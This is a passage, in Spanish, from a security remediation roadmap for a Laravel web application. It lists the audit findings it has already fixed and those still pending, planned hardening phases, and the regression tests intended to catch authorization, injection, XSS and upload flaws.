4. **Prohibir `$request->all()` en escrituras.** FormRequests con `validated()` en todos lados; `$fillable` explícito; linter/test que falle ante `create($request->all())`.
5. **Whitelist central de sort/filter** en una clase base de Search (mata C-3 y B-5 de una).
6. **Defensa en profundidad HTTP:** middleware de security headers + CSP nonce-based; throttling por grupo de auth; cookies `Secure`+`SameSite`.
7. **Gestión de secretos y tokens:** TTL de Passport, revocación en reset, rotación de la key de test, `composer/npm audit` en CI.

Esta arquitectura es **incremental**: cada pieza se puede introducir sin romper lo existente (las Policies conviven con los checks actuales; el Global Scope se activa modelo por modelo; los Resources se migran endpoint por endpoint).

---

## 4. Roadmap de implementación por fases

Ordenado por prioridad. Cada fase incluye tests de regresión.

### Fase 0 — Contención inmediata (esta semana · P0) — ✅ IMPLEMENTADA (2026-07-24)
Objetivo: cerrar lo explotable por bajo/nulo privilegio con mínimo riesgo funcional.
**Estado: completa y verificada — 208/208 tests en verde (23 Unit + 185 Feature).**

- [x] **C-1** `/ajax/usuario/linkear` ahora usa datos verificados por OAuth desde la sesión (`link_social`), ignora el body. `LoginController::callbackFromProvider` los setea; `UsuarioController::linkear` los consume.
- [x] **C-2** `/ajax/personas`, `/ajax/coordinadores` movidos a grupo `['verified','auth','can:accesoBackoffice']`; `getPersonas` devuelve `CoordinadorResource` con scope por `idPaisPermitido`; `admin/ajax/search/usuarios` movido dentro del grupo `/admin`.
- [x] **C-3** helper `App\Search\SortSanitizer` (whitelist estructural columna+dirección) aplicado en 13 clases Search, `EstadisticasController` (6 usos) y `backoffice/ajax/UsuariosController` (3 usos). Corrige además `$sort` indefinido latente.
- [x] **C-4** backstop central en `ImageUploadService::store()` (allowlist por extensión efectiva del contenido + cap 10 MB → 422) que protege los 13+ consumidores; + `mimes`/`max` explícito en voucher, foto, ficha médica, imágenes de actividad e integrantes. **Pendiente infra (deploy):** bloquear ejecución de PHP bajo `/storage` (el código ya impide almacenar ejecutables/SVG).
- [x] **A-3** `edad_desde/hasta` bindeados como `?` + cast `(int)` en `EstadisticasController` y `PersonasInscriptasExport`.
- **Tests añadidos:** `tests/Unit/SortSanitizerTest.php` (C-3), `tests/Unit/ImageUploadServiceTest.php` (C-4), `tests/Feature/SecurityFase0Test.php` (C-2 auth-gating), + regresión C-1 en `tests/Feature/LoginSocialTest.php` (linkear sin sesión no autentica; body ignorado).
- **Hallazgo nuevo derivado:** A-8 (`requiere.auth` es no-op). Los endpoints de C-2 se aseguraron con `auth` real, sin depender de `requiere.auth`.
- **Riesgo funcional:** bajo. Verificado sin regresiones sobre la suite completa.

### Fase 1 — AuthZ y auth hardening (semanas 2-4 · P1)
- [ ] **A-8** reemplazar grupos `requiere.auth`-solos por `auth` real (subida ficha médica, estudios, equipos).
- [ ] **A-1** `can:editar`/scope en rutas mutadoras de actividad; validar hijo⊂padre.
- [ ] **A-2** `can:editar` en gestión de coordinadores + país.
- [ ] **C-5** escapar campos base en Vuetable (server-side o `{{ }}`).
- [ ] **C-6** enrutar alta social por `providerLogin`; no confiar en id social del cliente.
- [ ] **A-4** throttle en login web/API y endpoints de auth.
- [ ] **A-5 + M-13** TTL de Passport + revocación en reset/cambio de contraseña.
- [ ] **A-6 + M-9** `SESSION_SECURE_COOKIE=true`, `same_site=lax`, forzar HTTPS.
- **Tests:** *Permission tests* por rol (coordinador vs admin) sobre cada ruta de actividad; *tenant isolation test* (user país A no puede tocar recurso país B); *auth flow test* (registro social sin token válido → rechazo); *throttle test*.

### Fase 2 — XSS, config y aislamiento tenant (mes 2 · P2)
- [ ] **A-7, M-14** sanitizar rich-text con allow-list (descripción, campaign message).
- [ ] **M-8** middleware de security headers + CSP.
- [ ] **M-1, M-2** completar policies/scope en lectura de personas y clonar/ver actividad.
- [ ] **M-3** scope de país + bloqueo de elevación a admin en asignación de roles.
- [ ] **M-4, M-5, M-15** eliminar mass assignment; `$fillable` explícito.
- [ ] **M-6, M-7** documentos/PII a disco privado; excluir SVG; activar cap de tamaño.
- [ ] **M-10, M-11, M-12, M-16** config debug/env, OAuth state, Sentry scrub, monto PayU server-side.
- [ ] **Introducir `BelongsToCountry` + Global Scope** en 1-2 modelos piloto.
- **Tests:** *XSS test* (payload en nombre/descripción → escapado en respuesta); *headers test*; *mass assignment test* (campo extra ignorado); *global scope test*.

### Fase 3 — Consolidación arquitectónica y bajos (mes 3+ · P3)
- [ ] Migrar endpoints restantes a **API Resources**.
- [ ] Hacer **Policies obligatorias** en todas las rutas de mutación; test que detecte rutas sin autorización.
- [ ] Extender Global Scope país a todos los modelos tenant.
- [ ] **B-1..B-7** (logs admin, política de contraseña, anti-enumeración, CSRF gate, dirección de sort, estado en login, misceláneos).
- [ ] **D-1** plan de upgrade de Laravel/Vue; `composer/npm audit` en CI; pipeline de security scanning (SAST).
- **Tests:** suite de *authorization matrix* (rol × ruta × país), integrada a CI.

---

## 5. Estrategia de tests automáticos anti-regresión

Los tests corren contra MySQL en Docker (`laravel_test`), no SQLite (ver memoria de test-suite). Propuestos por categoría:

- **Authorization tests** — por cada ruta sensible: usuario sin permiso → 403; con permiso → 200. Matriz rol × endpoint.
- **Tenant isolation tests** — usuario de país A intenta leer/editar/borrar recurso de país B → 403/404. Un test por modelo país-scopeado.
- **IDOR tests** — usuario A intenta acceder a inscripción/persona/actividad de usuario B por id → denegado.
- **Injection tests** — payloads en `sort`, `edad_*`, filtros → resultado válido, sin error SQL ni fuga.
- **Mass assignment tests** — enviar `roles`/`estadoPersona`/`pago`/`idPais` extra en updates → campo ignorado.
- **XSS / output-encoding tests** — nombre/descripción con `<script>` → escapado en JSON/HTML de respuesta.
- **Auth flow tests** — brute force (throttle dispara), registro social sin token válido (rechazo), reset revoca tokens.
- **Upload tests** — `.php`/`.svg`/oversize rechazados; disco privado para PII.
- **Config/headers tests** — respuestas incluyen headers de seguridad; cookies `Secure`+`SameSite`.

Meta: cada fix llega con su test; la *authorization matrix* se vuelve gate de CI para que rutas nuevas sin autorización fallen el build.

---

## 6. Lo que ya está bien (no re-auditar)

- Webhooks Stripe (donaciones y país) y confirmación PayU **verifican firma** y fallan cerrado.
- Montos de inscripción Stripe **derivados server-side** (`montoMin`/`costo`), no del cliente.
- Idempotencia en webhooks y creación de PI/suscripciones.
- API mobile de donaciones/inscripción Stripe/personas: **scope por `idPersona`** consistente, sin IDOR.
- `EnriquecedorFilas` **escapa** con `e()` los campos dinámicos; `CeldaSeguimiento/Whatsapp/Documento` usan interpolación segura.
- `ListadoConfigController` autoriza por registry y valida pertenencia del `record_id` al contexto.
- Hashing con **bcrypt** en todos los paths; sin `md5`/`sha1`.
- Secretos resuelven vía `env()`; `storage/*.key` gitignoreado; no hay API keys hardcodeadas en el repo.
- CSRF activo en todo el grupo `web`/`ajax`; exclusiones (`/pagos/*`, `stripe/webhook/*`) justificadas y firmadas.
